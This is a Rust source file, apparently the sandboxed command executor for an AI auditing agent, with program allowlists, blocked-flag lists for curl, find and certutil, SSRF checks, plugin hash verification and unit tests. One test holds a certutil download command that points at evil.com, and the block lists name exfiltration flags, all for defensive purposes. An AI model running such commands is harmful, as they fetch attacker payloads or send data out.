use crate::cloud_creds::CloudCredentialSet;
use crate::intent::ValidatedIntent;
use crate::output::{format_sandbox_output, trim_to_max};
use crate::policy::PolicyEngine;
use sha2::{Digest, Sha256};
use std::sync::Arc;
use std::time::Duration;
use tokio::process::Command;

const CMD_TIMEOUT_SECS: u64 = 30;
const FILE_MAX_BYTES: usize = 256 * 1024;
const HTTP_TIMEOUT_SECS: u64 = 10;
const HTTP_MAX_BODY_BYTES: usize = 64 * 1024;

/// Unix-native programs allowed for agent command execution.
#[cfg(not(windows))]
const ALLOWED_PROGRAMS: &[&str] = &[
    "ls",
    "cat",
    "find",
    "grep",
    "head",
    "tail",
    "wc",
    "stat",
    "file",
    "diff",
    "md5sum",
    "sha256sum",
    "sha1sum",
    "ps",
    // "env" removed: acts as a command launcher (`env bash -c '...'`), bypassing the allowlist entirely.
    "echo",
    "date",
    "id",
    "hostname",
    "uname",
    "df",
    "du",
    "pwd",
    "which",
    "whoami",
    "netstat",
    "ss",
    "lsof",
    // "nmap" and "openssl" removed: network pivoting risk. Add via AGENT_ALLOWED_PROGRAMS if needed.
    // "wget" removed: curl covers the same use case and is already in the tripwire ban list.
    //   wget supports recursive download (-r) and mirror (-m) which increase exfiltration surface.
    //   To re-enable, add "wget" to the AGENT_ALLOWED_PROGRAMS env var (comma-separated).
    "curl",
];

/// Windows-native programs allowed for agent command execution.
///
/// These are the native equivalents (or close analogues) of the Unix allowlist.
/// CMD builtins (dir, type, echo, date, cd, set, ver) are automatically
/// prefixed with `cmd.exe /C` at spawn time — see [`run_command_with_context`].
#[cfg(windows)]
const ALLOWED_PROGRAMS: &[&str] = &[
    // Directory & file inspection (≈ ls, cat, stat, file, find)
    "dir",
    "type",
    "where", // ≈ which
    "more",  // ≈ head/tail (paginated output)
    // Text search & comparison (≈ grep, diff)
    "findstr",
    "fc",
    // Hashing (≈ md5sum / sha256sum / sha1sum)
    "certutil", // `certutil -hashfile <path> SHA256`
    // Process & system info (≈ ps, uname, id, hostname, df, du)
    "tasklist",
    "hostname",
    "systeminfo",
    "wmic",
    // Environment & identity (≈ whoami, pwd, echo, date)
    "whoami",
    "echo",
    "date",
    "cd",
    "set",
    "ver",
    // Networking (≈ netstat, curl)
    "netstat",
    "curl",
    // Filesystem metadata (≈ stat, chmod — read-only inspection)
    "attrib",
    "icacls",
];

/// CMD builtins that must be spawned via `cmd.exe /C <builtin> <args...>`
/// because they are not standalone executables on Windows.
#[cfg(windows)]
const CMD_BUILTINS: &[&str] = &["dir", "type", "echo", "date", "cd", "set", "ver", "more"];

/// Returns the effective allowlist of programs, extended by AGENT_ALLOWED_PROGRAMS env var,
/// optional cloud CLI binaries (when creds are present), and optional plugin binaries.
fn allowed_programs_with_context(
    creds: Option<&CloudCredentialSet>,
    policy: Option<&PolicyEngine>,
) -> Vec<String> {
    let mut list: Vec<String> = ALLOWED_PROGRAMS.iter().map(|s| (*s).to_string()).collect();

    if let Ok(extra) = std::env::var("AGENT_ALLOWED_PROGRAMS") {
        for s in extra.split(',') {
            let t = s.trim().to_string();
            if !t.is_empty() && !list.contains(&t) {
                list.push(t);
            }
        }
    }

    // Cloud CLI binaries are added only when a credential set is loaded.
    if creds.is_some() {
        for b in crate::cloud_creds::CLOUD_CLI_BINARIES {
            let name = b.to_string();
            if !list.contains(&name) {
                list.push(name);
            }
        }
    }

    // Plugin binaries registered in the policy are added to the allowlist.
    if let Some(pe) = policy {
        for name in pe.effective_allowed_programs() {
            if !list.contains(&name) {
                list.push(name);
            }
        }
    }

    list
}

fn parse_command(cmd: &str) -> Result<(String, Vec<String>), ExecuteError> {
    let parts = shlex::split(cmd).ok_or_else(|| ExecuteError::InvalidCommand(cmd.to_string()))?;
    if parts.is_empty() {
        return Err(ExecuteError::InvalidCommand("empty command".to_string()));
    }
    Ok((parts[0].clone(), parts[1..].to_vec()))
}

/// Defense-in-depth: block dangerous arguments on programs that can be
/// weaponised for arbitrary execution or file writes even though they are
/// in `ALLOWED_PROGRAMS`.
fn validate_program_args(program: &str, args: &[String]) -> Result<(), ExecuteError> {
    const BLOCKED_ARGS: &[(&str, &[&str])] = &[
        ("find", &["-exec", "-execdir", "-ok", "-okdir", "-delete"]),
        (
            "curl",
            &[
                "-o",
                "--output",
                "-O",
                "--remote-name",
                "-T",
                "--upload-file",
                "-F",
                "--form",
                "--data-binary",
                "-d",
                "--data",
                "--data-raw",
                "--data-urlencode",
                // Additional flags that can be used for data exfiltration or SSRF:
                "--json",
                "--connect-to",
                "--resolve",
                "--unix-socket",
                "--abstract-unix-socket",
                "--proxy",
                "--socks4",
                "--socks5",
            ],
        ),
        ("xargs", &["-I", "--replace"]),
        // certutil (Windows) can download files, encode/decode, and modify cert stores.
        // Allow only read-only hash operations (certutil -hashfile).
        (
            "certutil",
            &[
                "-urlcache",
                "-encode",
                "-decode",
                "-addstore",
                "-delstore",
                "-importpfx",
                "-exportpfx",
                "-setreg",
            ],
        ),
    ];
    let prog_lower = program.to_lowercase();
    let prog_base = std::path::Path::new(&prog_lower)
        .file_name()
        .and_then(|f| f.to_str())
        .unwrap_or(&prog_lower);
    for (blocked_prog, blocked_flags) in BLOCKED_ARGS {
        if prog_base == *blocked_prog {
            for arg in args {
                let arg_lower = arg.to_lowercase();
                for flag in *blocked_flags {
                    if arg_lower == *flag || arg_lower.starts_with(&format!("{flag}=")) {
                        return Err(ExecuteError::ProgramNotAllowed(format!(
                            "{program} with '{flag}' argument is not allowed"
                        )));
                    }
                }
            }
        }
    }
    Ok(())
}

// ── Plugin binary integrity & path validation (TM-5b / TM-5d) ─────────────────

/// Directories that must NEVER be the resolved location of a plugin binary.
/// Prevents symlink attacks pointing plugin paths into system directories.
const BLOCKED_PLUGIN_DIRS: &[&str] = &[
    "/usr/bin",
    "/usr/sbin",
    "/sbin",
    "/bin",
    "/usr/local/sbin",
    "/System",
    "/Library",
    "C:\\Windows",
    "C:\\Windows\\System32",
    "C:\\Windows\\SysWOW64",
];

/// Verify a plugin binary's SHA-256 hash and resolved real path before spawning.
///
/// - **TM-5b**: If the plugin definition includes a `sha256` field, the binary
///   file is read and its hash is compared to the expected value. A mismatch
///   (indicating binary replacement or supply-chain compromise) is fatal.
///
/// - **TM-5d**: The binary path is canonicalized (following symlinks). If it
///   resolves to a system directory, execution is denied to prevent symlink-
///   based privilege escalation.
fn validate_plugin_binary(
    program: &str,
    policy: Option<&PolicyEngine>,
) -> Result<(), ExecuteError> {
    let plugin = match policy.and_then(|pe| pe.plugin_for(program)) {
        Some(p) => p,
        None => return Ok(()), // not a plugin binary; skip
    };

    // Resolve the binary to an absolute path via which/where equivalent.
    let resolved = match which::which(&plugin.binary) {
        Ok(p) => p,
        Err(_) => {
            // Binary not in PATH; let the later Command::new fail naturally.
            return Ok(());
        }
    };

    // TM-5d: Follow symlinks and reject paths under system directories.
    if let Ok(canonical) = std::fs::canonicalize(&resolved) {
        let canonical_str = canonical.to_string_lossy().to_string();
        for blocked in BLOCKED_PLUGIN_DIRS {
            if canonical_str.starts_with(blocked) {
                return Err(ExecuteError::PluginIntegrityFailed(format!(
                    "plugin '{}' binary resolves to system directory {} ({}); execution denied",
                    plugin.name, blocked, canonical_str,
                )));
            }
        }
    }

    // TM-5b: If a SHA-256 hash is declared, verify the binary.
    if let Some(expected_hash) = &plugin.sha256 {
        let binary_bytes = std::fs::read(&resolved).map_err(|e| {
            ExecuteError::PluginIntegrityFailed(format!(
                "plugin '{}': cannot read binary '{}' for hash verification: {}",
                plugin.name,
                resolved.display(),
                e
            ))
        })?;
        let actual_hash = hex::encode(Sha256::digest(&binary_bytes));
        if !constant_time_eq(expected_hash.as_bytes(), actual_hash.as_bytes()) {
            return Err(ExecuteError::PluginIntegrityFailed(format!(
                "plugin '{}' binary SHA-256 mismatch: expected {}, got {}",
                plugin.name, expected_hash, actual_hash
            )));
        }
    }

    Ok(())
}

/// Constant-time byte comparison (prevents timing side-channels on hash checks).
fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
    use subtle::ConstantTimeEq;
    if a.len() != b.len() {
        return false;
    }
    a.ct_eq(b).into()
}

pub async fn execute(validated: ValidatedIntent) -> Result<String, ExecuteError> {
    execute_with_policy(validated, None, None).await
}

/// Execute with optional cloud credentials and policy engine for allowlist and env injection.
pub async fn execute_with_policy(
    validated: ValidatedIntent,
    creds: Option<Arc<CloudCredentialSet>>,
    policy: Option<&PolicyEngine>,
) -> Result<String, ExecuteError> {
    let action = validated.action();
    match action {
        "run_command" => run_command_with_context(validated, creds.as_deref(), policy).await,
        "read_file" => read_file(validated).await,
        "http_get" => http_get(validated).await,
        "complete" => complete_audit(validated),
        _ => Err(ExecuteError::UnknownAction(action.to_string())),
    }
}

fn complete_audit(validated: ValidatedIntent) -> Result<String, ExecuteError> {
    let params = validated.params();
    if let Some(findings_val) = params.get("findings") {
        match serde_json::from_value::<Vec<crate::schema::AuditFinding>>(findings_val.clone()) {
            Ok(findings) => {
                let summary = findings
                    .iter()
                    .map(|f| format!("[{:?}] {}", f.severity, f.title))
                    .collect::<Vec<_>>()
                    .join(", ");
                return Ok(format!(
                    "Audit complete. {} finding(s): {}",
                    findings.len(),
                    if summary.is_empty() {
                        "none".to_string()
                    } else {
                        summary
                    }
                ));
            }
            Err(e) => {
                tracing::warn!(
                    "complete action findings did not conform to AuditFinding schema: {}",
                    e
                );
            }
        }
    }
    Ok("Audit complete.".to_string())
}

async fn run_command_with_context(
    validated: ValidatedIntent,
    creds: Option<&CloudCredentialSet>,
    policy: Option<&PolicyEngine>,
) -> Result<String, ExecuteError> {
    let cmd = validated
        .params()
        .get("command")
        .and_then(|v| v.as_str())
        .ok_or(ExecuteError::MissingParam("command"))?;

    let (program, args) = parse_command(cmd)?;

    let allowed = allowed_programs_with_context(creds, policy);
    let program_lower = program.to_lowercase();
    if !allowed.iter().any(|a| a.to_lowercase() == program_lower) {
        return Err(ExecuteError::ProgramNotAllowed(program));
    }

    // TM-5b/TM-5d: Verify plugin binary integrity (SHA-256) and resolved path.
    validate_plugin_binary(&program, policy)?;

    // Defense-in-depth: block dangerous arguments on specific allowed programs
    // that can be weaponised for arbitrary execution or file writes.
    validate_program_args(&program, &args)?;

    // On Windows, CMD builtins (dir, type, echo, …) are not standalone .exe
    // files — they must be run via `cmd.exe /C <builtin> <args>`.
    #[cfg(windows)]
    let (spawn_program, spawn_args) = {
        let prog_lower = program.to_lowercase();
        if CMD_BUILTINS.iter().any(|b| *b == prog_lower) {
            let mut cmd_args = vec!["/C".to_string(), program.clone()];
            cmd_args.extend(args.iter().cloned());
            ("cmd".to_string(), cmd_args)
        } else {
            (program.clone(), args.clone())
        }
    };
    #[cfg(not(windows))]
    let (spawn_program, spawn_args) = (program.clone(), args.clone());

    let mut child_cmd = Command::new(&spawn_program);
    child_cmd.args(&spawn_args);

    // Clear inherited env to prevent secret leakage (DATABASE_URL, API keys, etc.)
    // to child processes. Re-inject only minimal safe variables.
    child_cmd.env_clear();
    #[cfg(windows)]
    const SAFE_ENV_VARS: &[&str] = &[
        "PATH",
        "USERPROFILE",
        "USERNAME",
        "LANG",
        "TEMP",
        "TMP",
        "SYSTEMROOT",
        "COMSPEC",
    ];
    #[cfg(not(windows))]
    const SAFE_ENV_VARS: &[&str] = &["PATH", "HOME", "USER", "LANG", "TERM", "LC_ALL", "TMPDIR"];
    for var in SAFE_ENV_VARS {
        if let Ok(val) = std::env::var(var) {
            child_cmd.env(var, val);
        }
    }

    // Inject cloud CLI env vars into the child process only (parent env is unchanged).
    if let Some(c) = creds
        && crate::cloud_creds::is_cloud_cli(&program)
    {
        child_cmd.envs(&c.env_vars);
    }

    // Inject plugin env_passthrough vars for the matching plugin binary.
    if let Some(pe) = policy {
        let passthrough = pe.plugin_env_passthrough_for(&program);
        for var_name in passthrough {
            if let Ok(val) = std::env::var(&var_name) {
                child_cmd.env(&var_name, val);
            }
        }
    }

    // Apply the strongest available child-process sandbox on Unix platforms:
    //   - Linux (with `sandbox` feature): Landlock + rlimits + seccomp
    //   - macOS: Seatbelt (sandbox_init) profile
    //   - Other Unix: no-op (advisory tripwires only)
    // On Windows, the Job Object sandbox is applied once at main-process startup
    // (see main.rs) because Windows lacks the Unix pre_exec hook.
    #[cfg(unix)]
    {
        let workspace = std::env::current_dir().unwrap_or_else(|_| std::path::PathBuf::from("."));
        unsafe {
            child_cmd.pre_exec(move || {
                if let Err(e) = crate::sandbox::apply_child_sandbox(&workspace) {
                    // Graceful fallback: log the error but allow the child to proceed.
                    // The tripwire layer still provides advisory protection.
                    eprintln!(
                        "sandbox: OS-level isolation unavailable ({}); \
                         falling back to advisory tripwires",
                        e
                    );
                }
                Ok(())
            });
        }
    }

    let output = tokio::time::timeout(Duration::from_secs(CMD_TIMEOUT_SECS), child_cmd.output())
        .await
        .map_err(|_| ExecuteError::Timeout)?
        .map_err(ExecuteError::Io)?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let status = output.status;
    Ok(format_sandbox_output(status.code(), &stdout, &stderr))
}

async fn read_file(validated: ValidatedIntent) -> Result<String, ExecuteError> {
    let path = validated
        .params()
        .get("path")
        .and_then(|v| v.as_str())
        .ok_or(ExecuteError::MissingParam("path"))?;
    let content = tokio::fs::read_to_string(path)
        .await
        .map_err(ExecuteError::Io)?;
    if content.len() > FILE_MAX_BYTES {
        return Ok(format!(
            "file too large ({} bytes); showing first {} bytes: {}",
            content.len(),
            FILE_MAX_BYTES,
            trim_to_max(&content, FILE_MAX_BYTES)
        ));
    }
    Ok(content)
}

async fn http_get(validated: ValidatedIntent) -> Result<String, ExecuteError> {
    let url = validated
        .params()
        .get("url")
        .and_then(|v| v.as_str())
        .ok_or(ExecuteError::MissingParam("url"))?;

    // ── SSRF protection: reject internal / link-local / cloud-metadata targets ──
    if let Ok(parsed) = url::Url::parse(url) {
        let scheme = parsed.scheme();
        if scheme != "http" && scheme != "https" {
            return Err(ExecuteError::InvalidCommand(format!(
                "http_get: disallowed URL scheme '{}'",
                scheme
            )));
        }
        if let Some(host) = parsed.host_str() {
            // Resolve the hostname to catch DNS-rebinding and private IP targets.
            if let Ok(addrs) =
                tokio::net::lookup_host(format!("{}:{}", host, parsed.port().unwrap_or(80))).await
            {
                for addr in addrs {
                    let ip = addr.ip();
                    let is_private = match ip {
                        std::net::IpAddr::V4(v4) => {
                            v4.is_loopback()
                                || v4.is_private()
                                || v4.is_link_local()
                                || v4.is_unspecified()
                        }
                        std::net::IpAddr::V6(v6) => {
                            v6.is_loopback()
                                || v6.is_unspecified()
                                || v6.to_ipv4_mapped().is_some_and(|v4| {
                                    v4.is_loopback() || v4.is_private() || v4.is_link_local()
                                })
                        }
                    };
                    if is_private {
                        return Err(ExecuteError::InvalidCommand(format!(
                            "http_get: URL '{}' resolves to internal address {} (SSRF blocked)",
                            url, ip
                        )));
                    }
                }
            }
            // Also block well-known metadata hostnames.
            if host == "metadata.google.internal"
                || host.ends_with(".internal")
                || host.ends_with(".local")
                || host == "localhost"
            {
                return Err(ExecuteError::InvalidCommand(format!(
                    "http_get: URL host '{}' is disallowed (internal host)",
                    host
                )));
            }
        }
    }

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(HTTP_TIMEOUT_SECS))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .map_err(ExecuteError::Http)?;
    let response = client.get(url).send().await.map_err(ExecuteError::Http)?;
    let status = response.status();
    let body = response.bytes().await.map_err(ExecuteError::Http)?;
    if body.len() > HTTP_MAX_BODY_BYTES {
        return Ok(format!(
            "status: {}; body too large ({} bytes); first {} bytes: {}",
            status,
            body.len(),
            HTTP_MAX_BODY_BYTES,
            String::from_utf8_lossy(&body[..HTTP_MAX_BODY_BYTES.min(body.len())])
        ));
    }
    let text = String::from_utf8_lossy(&body).to_string();
    Ok(format!("status: {}; body: {}", status, text))
}

#[derive(Debug, thiserror::Error)]
pub enum ExecuteError {
    #[error("unknown action: {0}")]
    UnknownAction(String),
    #[error("missing param: {0}")]
    MissingParam(&'static str),
    #[error("invalid command: {0}")]
    InvalidCommand(String),
    #[error("program not allowed: {0}")]
    ProgramNotAllowed(String),
    #[error("plugin integrity check failed: {0}")]
    PluginIntegrityFailed(String),
    #[error("timeout")]
    Timeout,
    #[error("io: {0}")]
    Io(#[from] std::io::Error),
    #[error("http: {0}")]
    Http(#[from] reqwest::Error),
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::intent::{ProposedIntent, ValidatedIntent};

    #[test]
    fn parse_command_simple() {
        let (prog, args) = parse_command("ls -la").unwrap();
        assert_eq!(prog, "ls");
        assert_eq!(args, ["-la"]);
    }

    #[test]
    fn parse_command_empty_fails() {
        assert!(parse_command("").is_err());
    }

    #[test]
    fn allowed_programs_includes_ls() {
        let list = allowed_programs_with_context(None, None);
        #[cfg(not(windows))]
        assert!(list.iter().any(|s| s == "ls"));
        #[cfg(windows)]
        assert!(list.iter().any(|s| s == "dir"));
    }

    #[test]
    fn program_not_in_allowlist_rejected_at_runtime() {
        let intent = ValidatedIntent::from_proposed(ProposedIntent {
            action: "run_command".to_string(),
            params: serde_json::json!({ "command": "sudo ls" }),
            justification: "check elevated privileges".to_string(),
            reasoning: String::new(),
        });
        let result = tokio::runtime::Runtime::new()
            .unwrap()
            .block_on(run_command_with_context(intent, None, None));
        assert!(matches!(result, Err(ExecuteError::ProgramNotAllowed(p)) if p == "sudo"));
    }

    #[test]
    fn tripwire_accepts_safe_command_executor_allows() {
        #[cfg(not(windows))]
        let cmd = "ls -la";
        #[cfg(windows)]
        let cmd = "dir";

        let intent = ValidatedIntent::from_proposed(ProposedIntent {
            action: "run_command".to_string(),
            params: serde_json::json!({ "command": cmd }),
            justification: "listing directory contents".to_string(),
            reasoning: String::new(),
        });
        let result = tokio::runtime::Runtime::new()
            .unwrap()
            .block_on(run_command_with_context(intent, None, None));
        assert!(result.is_ok(), "expected Ok, got: {:?}", result);
    }

    #[test]
    fn cloud_cli_not_allowed_without_creds() {
        let intent = ValidatedIntent::from_proposed(ProposedIntent {
            action: "run_command".to_string(),
            params: serde_json::json!({ "command": "aws s3 ls" }),
            justification: "list s3 buckets".to_string(),
            reasoning: String::new(),
        });
        let result = tokio::runtime::Runtime::new()
            .unwrap()
            .block_on(run_command_with_context(intent, None, None));
        assert!(matches!(result, Err(ExecuteError::ProgramNotAllowed(p)) if p == "aws"));
    }

    #[test]
    fn certutil_hashfile_allowed() {
        // certutil with -hashfile should pass argument validation
        validate_program_args(
            "certutil",
            &["-hashfile".into(), "test.bin".into(), "SHA256".into()],
        )
        .expect("certutil -hashfile should be allowed");
    }

    #[test]
    fn certutil_urlcache_blocked() {
        let result = validate_program_args(
            "certutil",
            &[
                "-urlcache".into(),
                "-split".into(),
                "-f".into(),
                "http://evil.com/payload".into(),
            ],
        );
        assert!(result.is_err(), "certutil -urlcache should be blocked");
    }

    #[test]
    fn certutil_encode_blocked() {
        let result = validate_program_args(
            "certutil",
            &["-encode".into(), "in.bin".into(), "out.b64".into()],
        );
        assert!(result.is_err(), "certutil -encode should be blocked");
    }

    #[cfg(windows)]
    #[test]
    fn windows_dir_is_allowed() {
        let list = allowed_programs_with_context(None, None);
        assert!(
            list.iter().any(|s| s == "dir"),
            "dir should be in Windows allowlist"
        );
    }

    #[cfg(windows)]
    #[test]
    fn windows_cmd_builtin_wrapping() {
        // Verify that CMD builtins like `dir` get wrapped into `cmd /C dir <args>`
        let intent = ValidatedIntent::from_proposed(ProposedIntent {
            action: "run_command".to_string(),
            params: serde_json::json!({ "command": "dir /B" }),
            justification: "list directory".to_string(),
            reasoning: String::new(),
        });
        let result = tokio::runtime::Runtime::new()
            .unwrap()
            .block_on(run_command_with_context(intent, None, None));
        assert!(
            result.is_ok(),
            "dir should work as CMD builtin on Windows: {:?}",
            result
        );
    }

    #[cfg(not(windows))]
    #[test]
    fn unix_ls_is_allowed() {
        let list = allowed_programs_with_context(None, None);
        assert!(
            list.iter().any(|s| s == "ls"),
            "ls should be in Unix allowlist"
        );
    }

    /// Counterpart to `windows_cmd_builtin_wrapping`: on Unix, commands like
    /// `ls` are executed directly (no shell wrapping needed).
    #[cfg(not(windows))]
    #[test]
    fn unix_direct_execution_no_wrapping() {
        let intent = ValidatedIntent::from_proposed(ProposedIntent {
            action: "run_command".to_string(),
            params: serde_json::json!({ "command": "ls" }),
            justification: "list directory".to_string(),
            reasoning: String::new(),
        });
        let result = tokio::runtime::Runtime::new()
            .unwrap()
            .block_on(run_command_with_context(intent, None, None));
        assert!(
            result.is_ok(),
            "ls should execute directly on Unix without wrapping: {:?}",
            result
        );
    }
}
